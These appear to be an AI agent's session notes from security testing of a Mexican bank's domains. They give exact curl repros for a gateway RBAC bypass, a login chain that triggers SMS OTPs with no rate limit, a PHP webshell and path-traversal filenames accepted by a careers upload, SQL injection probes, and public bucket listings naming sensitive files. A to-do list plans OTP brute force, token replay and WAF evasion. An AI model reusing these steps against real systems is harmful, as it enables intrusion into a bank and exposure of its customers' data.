# Session Detail: *.bancoplata.mx (Plata / Banco Plata) — 2026-09-27

Class-level patterns live in SKILL.md. This file preserves the
session-specific artifacts: exact endpoints, headers, payload contracts,
bucket key distributions, and the untested next steps.

## Target map

| Host | Role | Notes |
|---|---|---|
| `bancoplata.mx` | Next.js marketing + origination (re-assets/_next) | CF-proxied 104.20.43.178 |
| `auth.bancoplata.mx` | auth-web SPA (SSO) | SPA + `/static/` → S3 bucket #2 |
| `prime.bancoplata.mx` | Envoy RBAC gateway (~20 service prefixes) | CF-proxied, denies w/o Origin |
| `empresa.bancoplata.mx` | pyme-web SPA (rolldown, `/static/` chunks) | inline JSON env config |
| `platacard.mx` | sibling TLD, same gateway (`prime.platacard.mx`) | CF-proxied |
| `plata.careers` / `career.platacard.mx` | Framer + custom ATS (`/api-internal`) | Turnstile sitekey `0x4AAAAAADq8EHf3AS00ZsfG` |
| `design./history./refiere.bancoplata.mx` | Framer sites on origin 31.43.160.6 (outside CF) | static only |
| `vpn./cvpn./issa./co-prime.diftech.net` | Cisco ASA/AnyConnect cluster | group enum via config-auth XML |
| `sentry.prime.diftech.{org,net}` | self-hosted Sentry (34.209.x) | projects 150/183/148 |
| `3ds-acs.platacard.mx` (160.119.138.13) + `uat-3ds-acs` (.43) | 3DS ACS, Imperva | NOT tested via TLS impersonation |
| `tracking.ib*.platacard.mx` | Instabug email tracking (AWS 18.198.x) | 503 "No server available" |

Vendor: Diftech (`diftech.net/.org`, `dif.tech`) — infra + prime gateway.

## Gateway RBAC bypass — exact repro

```bash
# Baseline (denied):
curl -sk https://prime.bancoplata.mx/pyme/platform/v1
# → "RBAC: access denied" (19 bytes)

# Opened:
curl -sk https://prime.bancoplata.mx/auth/api/v1/auth-flow/begin-login \
  -X POST -H "Content-Type: application/json" \
  -H "Origin: https://auth.bancoplata.mx" \
  -H "Referer: https://auth.bancoplata.mx/" \
  -H "x-plata-timezone: America/Mexico_City" -H "x-plata-locale: es" \
  -d '{}' -w '\n%{http_code}\n'
# → 400 Spring HATEOAS "Failed to convert ... BeginLoginReq ... parameter requestUri"
```

Route-origin sweep results: with `Origin: auth.bancoplata.mx`, ALL ten
origins tested opened `/auth/api/v1/auth-flow/*` (allowlist is route-scoped,
not origin-scoped for that route). Other prefixes (`/pyme/*`, `/surgate`,
`/widget-gate`, `/deligate`, `/event-manager`, `/ab-proxy/*`, `/avatars`,
`/confirmation/*`, `/auth/private/*`) stayed RBAC-denied for every origin —
they likely need a session cookie; retry those with a registered account.

## PAR → begin-login chain — full contract

SDK module: webpack chunk `7493-090c7bdd7a55716e.js` module id `93870`
(`mE=a(93870)`, class `Dz`). Contract:

```
POST /auth/api/v1/auth-flow/par   (x-www-form-urlencoded)
  response_type=code scope=openid code_challenge=$CC
  code_challenge_method=S256 state=$S nonce=$N
  client_id=ORIG_PFAE | ORIG_PM
  redirect_uri=https://bancoplata.mx/es/empresa/pfae/callback
               | https://bancoplata.mx/es/empresa/pyme/callback
  installation_id=$UUID prompt=login login_hint=$PHONE
→ 200 {"request_uri":"urn:plata:par:<64-hex>"}

GET /auth/api/v1/auth-flow/authorize?client_id=ORIG_PFAE&request_uri=$PAR
→ 302 Location: https://auth.bancoplata.mx/es?request_uri=...&redirect_url=...&require_phone=false&client_id=ORIG_PFAE&login_mode=full_auth&installation_id=...&expires_at=<unix>

POST /auth/api/v1/auth-flow/begin-login   (JSON)
  {"requestUri":"urn:plata:par:...","phone":"+52...","deviceInfo":{}}
→ 200 {"loginFlowId":"uuid","phone":"+521****5678",
       "possibleChallenges":[{"launched":true,"type":"CHALLENGE_TYPE_SEND_OTP"}]}
```

- Rate limit: none observed (4 begin-login in ~2s, all launched SMS OTP).
- begin-login returns `loginFlowId` for ANY phone (existing or not — no
  enumeration differential observed at this step; verify-challenge may
  differentiate, untested).
- `run-challenge` on a REJECTED flow → 500 `INTERNAL: Confirmation [uuid]
  has invalid status [REJECTED]` (state machine leak).
- `/token` (x-www-form-urlencoded) exists → `{"error":"INVALID_GRANT"}`
  for unknown code. PAR-replay/redirect-swap untested.

Own flow awaiting verify: `0e87ab66-970b-47ac-a8f2-07ddb6f72650`
(throwaway `+5215512345678` — next step: verify-challenge brute on OWN flow
only, payload `{"loginFlowId":...,"data":{"type":"CHALLENGE_TYPE_SEND_OTP","code":"XXXXXX"}}`).

## Other auth-flow routes (Spring error-signature enum)

| Path | Response |
|---|---|
| begin-login, run-challenge, verify-challenge, short-auth/verify, logout | 400/410/500 (exist) |
| finish-login | 405 POST not allowed, Allowed: [HEAD, GET] |
| token | 415 on JSON → works with x-www-form-urlencoded (INVALID_GRANT) |
| status/sessions/otp/verify/refresh/qr/call/widget/session/flow(s)/challenge(s)/login/signup/register/password-reset/whoami/me | 404 Page Not Found |

## Careers ATS (plata.careers/api-internal)

- `GET /api-internal/jobs?content=true|false` → 155 jobs, full Greenhouse
  shape (`gh_jid`, `requisition_id`, `internal_job_id`, `content` HTML).
- `GET /api-internal/jobs/<id>` → single job JSON (valid IDs only;
  `5389990008 OR 1=1` returned 200 with err-ish body — do NOT claim SQLi
  from that; CF blocked `'` payloads, and the OR-1=1 response looked like
  an error page. Treat as blocked/unconfirmed.)
- `POST /api-internal/apply-job?jobid=<id>` (JSON):
  - No `cf-turnstile-response` → 200 `{"success":"Candidate saved successfully"}`
  - Garbage token header → also 200 (validation absent entirely)
  - `{}` → 422 `Invalid attributes: first_name,last_name,email`
  - first_name >255 → 422 length validation
  - Non-existent jobid (e.g. `1`, neighbors, requisition ids) → 401
    `{"status":401,"error":"Failed to save person"}`
  - `jobid=...%20OR%201=1` (URL-encoded) → CF challenge block page
  - Phone with `'; DROP TABLE` → CF challenge block page
  - `resume_content` (base64) + `resume_content_filename`:
    - `shell.php` → 422 unsupported file type
    - `resume.html`/`resume.svg`/`resume.pdf%00.php`/`resume.pd`/`.PDF.php`/`.exe` → 422
    - `resume.pdf` with PHP webshell bytes → **200 accepted** (content not validated beyond ext)
    - `resume.php.pdf` → 200
    - `../../evil.pdf` → 200 (path traversal in filename accepted)
    - Attachments land in Greenhouse (private) — no public bucket mirror found
      (prefix scans `resumes/`, `candidates/`, `attachments/`, `uploads/` on
      both buckets → empty)
  - Turnstile sitekey from `JobApplicationConstants.BpucpbmN.mjs` (module
    exports constant `r = 0x4AAAAAADq8EHf3AS00ZsfG`, version `1.4`).
  - Source maps available: `*.mjs.map` (full source, e.g.
    `JobApplicationConstants.BpucpbmN.mjs.map` 30KB).

## S3 buckets

| Proxy path | Bucket | Region | Objects |
|---|---|---|---|
| `prime.bancoplata.mx/file-service/static/` | `platform-file-service-manager-prod-public` | us-west-2 | 1,255 (paginated via `?marker=`) |
| `auth.bancoplata.mx/static/` | `web-static-prod.prime.diftech.org` | — | 10,000+ (first 10k pulled; more pages unlisted) |

Notable bucket #1 keys: `Copy of Directorio de despachos de cobranza.pdf`
(collection agencies w/ RFC + emails), `Instructions_to_support_the_client_v1.pdf`
(13MB, support KB from `plata.sana.ai`), financial statements (2Q26),
`Buro_de_Entidades_Informacion_Banco_Plata.pdf`, b2b decks (`PlataDifiereSales.pdf`).
PUT → 403 AccessDenied (no write).
Notable bucket #2 prefixes: `internal/` (icons of an internal app), `hr-portal/`
(logos: Keycloak, Vault, Airflow, Temporal, LexisNexis, Complif, Fraudaverse,
Incode, Infobip, n8n, Kafka, Snowflake, Docusign…), `crm/`, `kyc-flow/`
(INE document samples), `plataforma/`, `origination-client-web/configs/*`
(`unauth_landing_title_hidden_pages.json`, `partners.json`,
`pos-b2b-partners.json`, `legalDocuments.json`).

## Untested next steps

1. verify-challenge OTP brute on OWN flow only (see flow id above).
2. `/auth/private/api/v1/auth-flow/*` with a real session (needs account).
3. `/confirmation/api/v1/confirmation-service`, `/widget-gate`, `/surgate`,
   `/deligate` with registered-account cookies per Origin.
4. PAR replay: mint with benign redirect_uri, call `/token` with swapped
   redirect_uri + real code (needs a real login completion first).
5. 3DS ACS (`3ds-acs.platacard.mx`) via `curl_cffi --impersonate chrome120`
   (Imperva blocking raw curl).
6. Bucket #2: paginate past 10k keys.
7. `invest-web-gateway-prod.prime.diftech.org` — NXDOMAIN from here;
   resolve from a resolver in region or check CF fronting (`auth-prime-cf.platacard.mx`
   pattern suggests CF-fronted variants exist).
8. Cisco ASA: harvest group names → targeted password spray is out of scope
   (user REJECT list); only note as recon.
